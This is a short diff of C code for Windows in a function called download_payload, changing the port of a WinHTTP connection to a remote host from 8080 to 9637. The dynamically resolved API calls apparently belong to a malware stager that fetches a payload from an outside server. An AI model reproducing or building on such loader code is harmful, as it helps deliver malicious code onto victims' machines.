@@ -74,7 +74,7 @@ LPVOID download_payload()
     if (!hSession)
         return NULL;
 
-    HINTERNET hConnect = pWinHttpConnect(hSession, str_host, 8080, 0);
+    HINTERNET hConnect = pWinHttpConnect(hSession, str_host, 9637, 0);
     if (!hConnect)
     {
         pWinHttpCloseHandle(hSession);
